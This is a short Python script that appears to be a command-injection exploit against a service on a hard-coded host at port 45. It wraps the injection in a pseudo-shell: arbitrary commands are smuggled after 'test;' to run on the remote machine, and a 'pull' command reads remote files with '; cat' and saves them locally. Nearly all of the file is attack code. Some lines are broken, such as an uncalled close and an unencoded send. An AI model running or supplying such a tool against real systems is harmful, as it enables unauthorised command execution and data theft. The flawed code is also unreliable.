import socket
import time

from pip._vendor.distlib.compat import raw_input

host = "cornerstoneairlines.co"  # IP address here
port = 45  # Port here


def run(pth, cmd, second):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    split = str.split(cmd)

    if second == 10:
        s.recv(1024)
        s.send(str.encode("test; cd ") + str.encode(pth) + str.encode(" ;") + str.encode(cmd) + str.encode("\n"))
        data = s.recv(1024)
        time.sleep(2)
        print(data)

    elif split[0] == "pull":
        s.send("; cat " + split[1] + "\n")
        data = s.recv(4096)
        f = open(split[2], 'w')
        f.write(data)
        f.close()

    else:
        print(
            "shell Drop into an interactive shell and allow users to gracefully exit\n"
            "pull <remote-path> <local-path> Download files\nhelp Shows this help menu\nquit Quit the shell")

    s.close


if __name__ == '__main__':

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    first = True;

    while first:
        cmd = raw_input(">")
        pth = "/"
        spit = str.split(cmd)

        if spit[0] == "pull":
            run(pth, cmd, 15)

        elif cmd == "quit":
            exit()
            s.close()

        elif cmd == "shell":
            pth = "/"
            second = True

            while second:
                cmd = raw_input(pth + ">")

                if cmd == "exit":
                    second = False

                elif "cd" in cmd:
                    pth = cmd[3:]
                    if not pth: pth = "/"

                else: run(pth, cmd, 10)
        else :
            print(
                "shell Drop into an interactive shell and allow users to gracefully exit\n"
                "pull <remote-path> <local-path> Download files\nhelp Shows this help menu\nquit Quit the shell")
